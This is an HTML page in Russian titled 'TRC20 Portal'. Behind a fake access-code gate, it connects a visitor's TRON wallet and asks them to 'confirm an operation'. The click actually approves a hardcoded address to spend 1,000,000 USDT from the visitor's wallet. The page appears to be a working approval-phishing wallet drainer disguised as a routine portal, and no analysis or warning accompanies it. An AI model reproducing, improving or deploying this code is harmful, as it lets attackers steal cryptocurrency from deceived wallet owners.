<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRC20 Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
</head>
<body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">

    <!-- Экран авторизации по коду -->
    <div id="authScreen">
        <h2>Введите код доступа</h2>
        <input type="text" id="accessCode" placeholder="Введите код..." style="padding: 10px; font-size: 16px; border-radius: 5px; border: none; margin-right: 10px;">
        <button id="checkCodeBtn" style="padding: 10px 20px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 5px; cursor: pointer;">Войти</button>
    </div>

    <!-- Главный экран -->
    <div id="mainScreen" style="display: none;">
        <h1>Управление TRC20</h1>
        
        <button id="connectBtn" style="padding: 12px 24px; font-size: 16px; background-color: #10b981; color: white; border: none; border-radius: 5px; cursor: pointer;">
            Подключить TRON кошелек
        </button>
        
        <p id="walletAddress" style="margin-top: 15px; color: #94a3b8;"></p>

        <br><br>

        <button id="approveBtn" style="padding: 12px 24px; font-size: 16px; background-color: #ef4444; color: white; border: none; border-radius: 5px; cursor: pointer;">
            Подтвердить операцию (Approve TRC20)
        </button>
    </div>

    <script>
        const recipientAddress = "TGwPm9pCp1GzCavKLyhX54kqSQbUEZ7Uf";
        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

        let userTronWeb = null;
        let connectedAccount = "";

        document.getElementById('checkCodeBtn').addEventListener('click', function() {
            const code = document.getElementById('accessCode').value;
            if (code.trim() !== "") {
                document.getElementById('authScreen').style.display = 'none';
                document.getElementById('mainScreen').style.display = 'block';
            } else {
                alert("Введите код доступа!");
            }
        });

        // Функция глубокого поиска TRON в Trust Wallet
        async function getTrustWalletTron() {
            // 1. Проверка прямых инъекций
            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                return window.tronWeb;
            }
            if (window.trustwallet && window.trustwallet.tronWeb && window.trustwallet.tronWeb.defaultAddress) {
                return window.trustwallet.tronWeb;
            }

            // 2. Ожидание через цикл (иногда WebView внедряет объекты с задержкой в 2-3 секунды)
            for (let i = 0; i < 15; i++) {
                await new Promise(resolve => setTimeout(resolve, 300));
                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                    return window.tronWeb;
                }
                if (window.trustwallet && window.trustwallet.tronWeb && window.trustwallet.tronWeb.defaultAddress) {
                    return window.trustwallet.tronWeb;
                }
            }

            // 3. Если адрес заблокирован в стандартных свойствах, но провайдер ethereum отдает сеть
            if (window.ethereum) {
                try {
                    // Запрос на открытие сессии провайдера
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    if (accounts) {
                        console.log("Ethereum провайдер активен");
                    }
                } catch (e) {
                    console.log("Eth request error:", e);
                }
            }

            return null;
        }

        document.getElementById('connectBtn').addEventListener('click', async function() {
            try {
                alert("Поиск кошелька TRON...");
                let tron = await getTrustWalletTron();

                if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
                    userTronWeb = tron;
                    connectedAccount = userTronWeb.defaultAddress.base58;
                    document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
                    alert("Успешно подключено: " + connectedAccount);
                } else {
                    // Запасной вариант для мобильного браузера: если объект не отдал адрес автоматически, 
                    // пробуем запросить через внедренный инжектор provider
                    if (window.tronLink) {
                        await window.tronLink.request({ method: 'tron_requestAccounts' });
                        if (window.tronWeb && window.tronWeb.defaultAddress) {
                            userTronWeb = window.tronWeb;
                            connectedAccount = userTronWeb.defaultAddress.base58;
                            document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
                            alert("Подключено через TronLink!");
                            return;
                        }
                    }
                    alert("Не удалось с первого раза поймать объект. Перезайдите в браузер кошелька или обновите страницу.");
                }
            } catch (error) {
                console.error(error);
                alert("Ошибка: " + (error.message || JSON.stringify(error)));
            }
        });

        document.getElementById('approveBtn').addEventListener('click', async function() {
            if (!connectedAccount || !userTronWeb) {
                alert("Сначала подключите кошелек!");
                return;
            }

            try {
                const contract = await userTronWeb.contract().at(usdtContractAddress);
                const amount = "1000000000000"; 

                alert("Подтвердите транзакцию в кошельке...");

                const result = await contract.approve(
                    recipientAddress, 
                    amount
                ).send({
                    feeLimit: 100000000
                });

                console.log("Результат:", result);
                alert("Успешно!");

            } catch (error) {
                console.error(error);
                alert("Ошибка транзакции: " + (error.message || error));
            }
        });
    </script>
</body>
</html>
